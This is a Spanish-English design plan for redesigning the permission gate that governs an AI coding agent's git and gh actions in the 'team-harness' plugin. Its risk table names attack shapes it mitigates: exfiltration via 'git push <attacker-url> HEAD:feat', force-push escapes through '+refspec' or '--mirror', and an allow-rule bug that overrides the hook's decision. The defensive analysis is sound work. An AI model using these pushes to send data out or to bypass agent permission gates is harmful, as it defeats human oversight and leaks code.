**Status:** DELIVERED | **Date:** 2026-07-06


# Plan: th-friction-redesign
**Date:** 2026-07-06
**Agent:** architect
**Reviews:** substance pass · security clean · shape pass → combined **pass** — detail: reviews/01-plan-review.md

## Review Summary

> Este build embarca DENTRO de team-harness el rediseño del modelo de permisos/fricción del research report: el dev-guard pasa de "toda covered action → ask incondicional" a "gatea por destino, permitiendo sin prompt el push de una branch no-default en `origin`" (WI-1), extiende el contrato de permission-provisioning para distribuir un allowlist de solo-lectura + verbos gh de lectura + `mcp__memory__*` + `additionalDirectories` a todo usuario (WI-2/WI-3), batchea las mutaciones GraphQL de review en una sola llamada aliased con preview obligatorio (WI-4), y agrega una ruta de release single-PR basada en marker que preserva el invariante de tres sitios de versión desacoplado del nombre de branch (WI-5), reconciliando el enunciado de contrato refinado en ~10 sitios (WI-6). Toca un solo repo/una sola unidad desplegable (el plugin `th`); el riesgo principal es de seguridad: por el bug #18312 un allow-rule anula la decisión del hook, así que el allowlist embarcado DEBE ser disjunto del conjunto de outward-actions (lo que excluye toda forma de `gh api`), verificado por un test catalogue-driven con canary.

**Tasks:** 5 | **Services:** team-harness | **Estimated complexity:** complex

### Decisions for human review
- **Delivery grouping = un solo PR** — el research sugería un PR por WI "para foco de revisión"; foco-de-revisión NO está en la lista cerrada de razones de split, y ninguna razón temporal-prod (coexistence window / production signal / cross-repo deploy gate) aplica en un repo único. La estrategia de revisabilidad documentada es granularidad por-commit dentro del PR. → decided as `all-tasks-one-pr`
- **Release de ESTE build** — bootstrap: la ruta de reconocimiento del marker en prepublish-guard no está activa hasta que el hook nuevo se instale, así que ESTE build se publica con el modelo vigente (`skip-version: true` + fragment `changelog.d/`, cut diferido por `/th:release`). La ruta single-PR aplica a builds futuros ya instalados. → decided as existing deferred cut
- **test.yml path-filter vs trampa de required-check** — un `paths-ignore` que saltea un status-check *required* lo deja "pending" para siempre y bloquea el merge. El patrón seguro es un job gate que corre siempre y hace no-op condicional. → open question: adoptar el patrón conditional-noop, o diferir la optimización CI R2 de WI-5
- **Formato del marker de release-cut** — `version.d/.release-cut` (archivo in-tree, señal durable, preferido) con `release-cut: vX.Y.Z` como commit-trailer secundario. → decided as file-primary, trailer-secondary
- **PR-create autogate** — se mantiene `gh pr create` gated por defecto con opt-in `autogate.pr_create` (default off) leído por el reader del dev-guard; aceptado por el operador. → decided as gated-default + opt-in

### Proposed Approach
Reutilizar los precedentes exactos del repo en lugar de inventar mecanismos: (1) WI-1 inyecta un `DevGuardReader` espejando `PrepublishReader` (`prepublish-guard.ts:34-58`) y la resolución de payload-cwd de `prepublish-guard.cc.ts:164-183`; el shim ya traduce `allow` (`shim.ts:301-315`), así que no cambia. El recognizer de push es una allowlist-de-formas CERRADA: `allow` EXCLUSIVAMENTE para una única forma simple reconocida (un solo refspec, destino = branch no-default conocida en `origin`, sin `+`/force/`--mirror`/`--all`/`--tags`/`--delete`), extrayendo el destino del lado derecho del último colon; toda otra forma → `ask`/`none`, nunca `allow`. Diseño híbrido: parsear el refspec explícito sin exec y ejecutar git SOLO para el push pelado, con fallback estático a `{main, master}` y fail-closed a `ask`. (2) WI-2/WI-3 extienden el contrato maduro de `docs/permission-provisioning.md` con una clase nueva de allow-rules acotada por el invariante de disjunción (#18312). (3) WI-5 agrega un branch de reconocimiento de marker en `runFeaturePath`/`runVersionBumpCheck` que rutea a la release-path existente, preservando (no relajando) el invariante de tres sitios. Hay opciones menores de forma de implementación (formato de marker, forma de invocación `--with` vs sub-modo), todas con precedente claro; ninguna bifurca la arquitectura.

### Confidence Score
**Confidence:** 6/10 (single-pass)
- Blast radius: ~25 archivos, dos hook-bodies con sus entries + dist, ~10 sitios de contrato, CI y suites nuevas — la superficie sola hace probable un segundo pase en la reconciliación multi-sitio o un rebuild de dist.
- Prior art: muy fuerte — `prepublish-guard` es un precedente exacto de reader-injection + payload-cwd; el contrato de provisioning y el patrón de batching están maduros. Sube la confianza.
- Unknowns: el reader exec en el runtime opencode (Bun) es una superficie de subproceso nueva (precedentada pero no idéntica), y la interacción del path-filter de test.yml con required-checks es una trampa real de CI.

### Patterns to Mirror
- `hooks/ts/bodies/prepublish-guard.ts:34-58` — la interface `PrepublishReader`; espejar como `DevGuardReader` (WI-1).
- `hooks/ts/entry/prepublish-guard.cc.ts:21-125` — el reader real (`execFileSync` git, fail-open a null) y `resolveWorktreeCwd:164-183` (scoping al payload cwd); replicar para `dev-guard.cc.ts` (WI-1).
- `hooks/ts/shim/shim.ts:301-315` — `outboundCC` ya emite `permissionDecision:"allow"`; confirma que NO se toca el shim.
- `hooks/ts/bodies/prepublish-guard.ts:299-354` — `runFeaturePath`/`runReleasePath` + `resolveBranch`; extender con el branch del marker (WI-5).
- `docs/permission-provisioning.md` (contrato completo) + `skills/setup/SKILL.md:158-202` (§3a, patrón de oferta gated) — extender para el allowlist (WI-2).
- `tests/test_prepublish_bump_floor.sh` — patrón de fixture real-git; base para los tests de branch-aware (WI-1) y del marker (WI-5).

### Risks
| Risk | Severity | Mitigation |
|------|----------|------------|
| #18312 — un allow-rule anula la decisión del hook; un allowlist que solape una outward-action rompería el floor (push a main sin prompt) | high | Invariante de disjunción: el allowlist embarcado es disjunto del catálogo de outward-actions del dev-guard, verificado por un test catalogue-driven con canary (Task-3 AC-2/AC-4/AC-8) |
| Recognizer de `git push` incompleto — un refspec con destino default (`HEAD:main`), multi-refspec o `--mirror`/`--all` auto-permitiría un push a `main` | high | Recognizer CERRADO: `allow` sólo para una única forma simple reconocida; extracción de destino (lado derecho del último colon); fail-closed sobre toda forma desconocida (Task-1 AC-2/AC-3/AC-5) |
| Exfil vía remote atacante — branch-aware que sólo mira la branch destino auto-permitiría `git push <attacker-url> HEAD:feat` | medium | `allow` sólo cuando el remote resuelve a `origin` por NOMBRE; cualquier otro remote/URL → `ask`; la integridad de la URL de `origin` es supuesto del modelo y los comandos remote-mutating quedan fuera del allowlist (Task-1 AC-6/AC-13) |
| Force-push escapa como `allow` (flag `-f`/`--force` o prefijo `+refspec`/`--mirror`) | high | El dev-guard autodetecta force por FLAG y por `+refspec`/`--mirror` → `ask`, nunca `allow`; `policy-block` (policy-block.ts:58, flag-only) NO es backstop para `+refspec`/`--mirror` — el dev-guard se autocubre (Task-1 AC-8/AC-9) |
| `gh api` en el allowlist rompería la disjunción #18312 (ningún prefijo de `gh api` es disjunto de las mutaciones outward) | high | Excluir TODA forma de `gh api` del set embarcado; los verbos gh inertes prefix-safe (`gh pr view/list`, `gh issue view/list`) sí se incluyen (Task-3 AC-7) |
| dist stale committeado (cualquier cambio de hook-body requiere rebuild) | medium | Job `dist-freshness` (rebuild+diff) + rebuild sobre el árbol final antes del push (Task-1/Task-4 AC de VERIFY dist) |
| Trampa de required-check con `paths-ignore` en test.yml | medium | Patrón conditional-noop gate job en vez de `paths-ignore`; ver Decisión 3 |
| Superficie de exec nueva del reader en opencode (Bun) | low | argv fijo, sin interpolación de input, timeout-bounded, fail-closed a `ask`; precedente `prepublish-guard` (Task-1 AC-14) |
| Invariante de tres sitios relajado por la ruta del marker | high-if-wrong | El marker autoriza CORRER la release-path, nunca BYPASSEARLA: parse estricto SEMVER_RE → deny sobre no-semver; exige los tres sitios + match; el fail-open sobre CLAUDE.md §3 se preserva sin cambio (Task-4 AC-1/AC-2/AC-9/AC-10) |

### Trade-offs
- Un PR grande con commits por-concern sobre 5 PRs por-WI — sigue la estrategia de revisabilidad documentada (granularidad por-commit), evita 5 corridas de CI y 5 ciclos review/merge; el costo es un diff único mayor, mitigado por el scoping de commits y el DAG de tasks.
- Marker-file desacoplando el release-cut sobre relajar el regex de release-branch — preserva el floor de tres sitios; el costo es un artefacto de marker nuevo que gestionar.
- Diseño híbrido parse-luego-exec en el dev-guard sobre siempre-exec — la mayoría de los casos se deciden sin spawnear git (refspec explícito + fallback estático de default-branch); el exec queda sólo para el push pelado, reduciendo la superficie de subproceso nueva.

### Classification block
- touches_http_api: false
- touches_ui: false
- touches_data_model: false
- touches_cli: true
- touches_public_lib_api: false
- touches_async_messaging: false
- destructive: false
- spans_multiple_services: false

Razonamiento de los dos calls no-triviales que el dispatch pidió: **touches_cli: true** porque WI-5 introduce una forma de invocación nueva operator-facing (`/th:release --with <feature-branch>`) y cambia la semántica del Step 3 (tag push manual → verify-only); el sketch `sketches/cli-surface.md` documenta la superficie. El cambio de semántica de gate del dev-guard sobre `git`/`gh` altera el *prompteo*, no la superficie de comando, y va como nota de comportamiento en ese sketch. **touches_public_lib_api: false** porque el plugin `th` no se importa como librería: el cambio de firma `evaluate(input)` → `evaluate(input, reader)` es detalle interno de implementación, y el contrato *behavioral* público del gate se captura por la tabla Multi-site invariants + el cli-surface sketch, no por una firma importable. Las demás son claramente false: no hay HTTP API expuesta, ni UI, ni modelo de datos, ni mensajería asíncrona; no hay operación destructiva de datos; y toca un solo repo/una sola unidad desplegable.

### Multi-site invariants

Tres invariantes viven en más de un archivo. Delivery Step 9.4a lee esta tabla y verifica consistencia de cada sitio; un sitio ausente es invisible al MATCH check.

**(a) Enunciado de contrato refinado del dev-guard** (WI-6 — reconciliar en TODOS los sitios, un solo PR):

| Invariant | Site | File | Anchor / field |
|-----------|------|------|----------------|
| dev-guard refined statement | canonical gate table | `docs/dev-mode.md` | § Outward-Action Gate (tabla + enunciados líneas 3, 13, 19) |
| dev-guard refined statement | output-style floor | `output-styles/developer-mode.md` | enunciado gate (≈ líneas 51, 80) |
| dev-guard refined statement | how-it-works overview | `docs/how-it-works.md` | ≈ línea 136 |
| dev-guard refined statement | setup gate summary | `skills/setup/SKILL.md` | ≈ línea 251 + Step 4e report block |
| dev-guard refined statement | managed-block source | `skills/setup/managed-blocks/orchestrator-dispatch-rule.md` | § Outward-action gate (≈ línea 18) — propaga a `~/.claude/CLAUDE.md` vía `/th:update` |
| dev-guard refined statement | project bootstrap | `CLAUDE.md` | §5 (≈ línea 166) |
| dev-guard refined statement | knowledge base | `docs/knowledge.md` | entrada del outward-action gate |
| dev-guard refined statement | CC adapter notes | `hooks/adapters/dev-guard.claude-code.yaml` | `notes` |
| dev-guard refined statement | opencode adapter notes | `hooks/adapters/dev-guard.opencode.yaml` | `notes` |

**(b) Invariante de tres sitios de versión + marker** (WI-5 — ESTE build NO bumpea versiones; sitios documentados para delivery/release futuro):

| Invariant | Site | File | Anchor / field |
|-----------|------|------|----------------|
| plugin version | version site 1 | `.claude-plugin/plugin.json` | `version` |
| plugin version | version site 2 | `.claude-plugin/marketplace.json` | `plugins[0].version` |
| plugin version | version site 3 | `CLAUDE.md` | §3 `**Current version:**` |
| release-cut marker | decoupling signal | `version.d/.release-cut` | contenido `vX.Y.Z` (o commit-trailer `release-cut: vX.Y.Z`) |
| marketplace schema version — **fenced: MUST NOT change** | schema-level version | `.claude-plugin/marketplace.json` | top-level schema `version` (NO es `plugins[0].version`) |

**(c) Contenido del allowlist de provisioning** (WI-2/WI-3 — idéntico en los tres sitios, o referenciando el doc canónico):

| Invariant | Site | File | Anchor / field |
|-----------|------|------|----------------|
| read-only allowlist set | canonical contract | `docs/permission-provisioning.md` | § "Read-only allowlist — disjointness invariant" (nueva) |
| read-only allowlist set | setup site A | `skills/setup/SKILL.md` | § 3a |
| read-only allowlist set | orchestrator site B | `agents/orchestrator.md` | Phase 0a Step 1g |
| disjointness (allowlist ∩ outward-actions = ∅) | outward-action catalogue source | `hooks/ts/bodies/dev-guard.ts` | patrones outward (GIT_PUSH_RE, GH_*_RE, …) referenciados por el test de disjunción |

---
